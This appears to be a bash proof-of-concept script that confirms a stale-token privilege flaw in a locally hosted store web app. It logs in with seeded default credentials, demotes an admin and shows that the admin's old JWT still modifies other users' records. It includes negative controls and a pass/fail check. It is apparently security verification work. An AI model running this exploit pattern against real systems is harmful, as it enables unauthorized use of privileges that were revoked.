#!/usr/bin/env bash
set -u
B=http://localhost:3000

acc() { python3 -c "import sys,json;print(json.load(sys.stdin).get('accessToken',''))" 2>/dev/null; }
login() { curl -s -X POST "$B/v1/authentication/login" -H 'Content-Type: application/json' -d "{\"email\":\"$1\",\"password\":\"$2\"}"; }
chpw() { curl -s -X POST "$B/v1/authentication/change-password" -H "Authorization: Bearer $1" -H 'Content-Type: application/json' -d "{\"currentPassword\":\"$2\",\"newPassword\":\"$3\"}"; }
claim() { echo "$1" | cut -d. -f2 | python3 -c "import sys,base64,json;s=sys.stdin.read().strip();s+='='*(-len(s)%4);d=json.loads(base64.urlsafe_b64decode(s));print('role=%s sub=%s mustChange=%s'%(d.get('role'),d.get('sub'),d.get('mustChangePassword')))"; }
C() { curl -s -o /tmp/rf -w '%{http_code}' -X "$1" "$B$2" -H "Authorization: Bearer $3" -H 'Content-Type: application/json' -d "$4"; }
body() { head -c 90 /tmp/rf | tr '\n' ' '; }

echo "== obtain clean admin tokens (login -> change password) =="
TS=$(login superadmin@store.local 'SuperAdmin123!' | acc)
TS=$(chpw "$TS" 'SuperAdmin123!' 'SuperAdmin123!x' | acc); echo "  superadmin: $(claim "$TS")"
TV=$(login admin@store.local 'Admin123!' | acc)
TV=$(chpw "$TV" 'Admin123!' 'Admin123!x' | acc); echo "  admin(victim): $(claim "$TV")"
TC=$(login customer@store.local 'Customer123!' | acc)
TC=$(chpw "$TC" 'Customer123!' 'Customer123!x' | acc); echo "  customer: $(claim "$TC")"

echo "== user ids =="
curl -s -G "$B/v1/users" -H "Authorization: Bearer $TS" > /tmp/ulist
python3 -c "import json;d=json.load(open('/tmp/ulist'));u=d.get('data',d) if isinstance(d,dict) else d;u=u.get('items',u) if isinstance(u,dict) else u;[print(' ',x.get('id'),x.get('email'),x.get('role')) for x in u]" 2>/dev/null | head
ADMINID=$(python3 -c "import json;d=json.load(open('/tmp/ulist'));u=d.get('data',d) if isinstance(d,dict) else d;u=u.get('items',u) if isinstance(u,dict) else u;print([x['id'] for x in u if x.get('email')=='admin@store.local'][0])" 2>/dev/null)
CUSTID=$(python3 -c "import json;d=json.load(open('/tmp/ulist'));u=d.get('data',d) if isinstance(d,dict) else d;u=u.get('items',u) if isinstance(u,dict) else u;print([x['id'] for x in u if x.get('email')=='customer@store.local'][0])" 2>/dev/null)
echo "  ADMINID=$ADMINID CUSTID=$CUSTID"

echo "== NEG CONTROL: customer PATCH /users/{cust} -> expect 403 =="
C_NEG=$(C PATCH /v1/users/$CUSTID "$TC" '{"firstName":"ByCustomer"}'); echo "  neg=$C_NEG $(body)"
echo "== A/B victim_old (ADMIN) PATCH /users/{cust} (SOURCE before) -> expect 2xx =="
echo "  victim token: $(claim "$TV")"
C_BEFORE=$(C PATCH /v1/users/$CUSTID "$TV" '{"firstName":"SrcBefore"}'); echo "  before=$C_BEFORE $(body)"
echo "== D TRANSITION superadmin demotes admin -> CUSTOMER -> expect 2xx =="
C_TRANS=$(C PUT /v1/users/$ADMINID/role "$TS" '{"roleCode":"CUSTOMER"}'); echo "  transition=$C_TRANS $(body)"
echo "== E BUG victim_old SAME token PATCH /users/{cust} (after demotion) -> expect 2xx =="
C_AFTER=$(C PATCH /v1/users/$CUSTID "$TV" '{"firstName":"SrcAfter"}'); echo "  after=$C_AFTER $(body)"
echo "== F D1 admin re-login (new pw) new token -> PATCH -> expect 403 =="
TVN=$(login admin@store.local 'Admin123!x' | acc); echo "  new token: $(claim "$TVN")"
C_NEW=$(C PATCH /v1/users/$CUSTID "$TVN" '{"firstName":"NewTok"}'); echo "  newtok=$C_NEW $(body)"

echo "== VERDICT =="
ok=1
case "$C_BEFORE" in 2*) ;; *) echo "  X source before not 2xx ($C_BEFORE)"; ok=0;; esac
case "$C_TRANS" in 2*) ;; *) echo "  X transition not 2xx ($C_TRANS)"; ok=0;; esac
case "$C_AFTER" in 2*) ;; *) echo "  X old-token after not 2xx ($C_AFTER)"; ok=0;; esac
[ "$C_NEW" = 403 ] || { echo "  X new-token != 403 ($C_NEW)"; ok=0; }
[ "$C_NEG" = 403 ] || { echo "  X neg != 403 ($C_NEG)"; ok=0; }
if [ "$ok" = 1 ]; then
  echo "  PASS: MR-A1 confirmed on running raouf $(git -C infra/raouf-target/app rev-parse --short HEAD 2>/dev/null)"
  echo "  old-token(role ADMIN) after demotion=$C_AFTER vs new-token(role CUSTOMER)=$C_NEW ; neg=$C_NEG"
  exit 0
else echo "  FAIL"; exit 1; fi
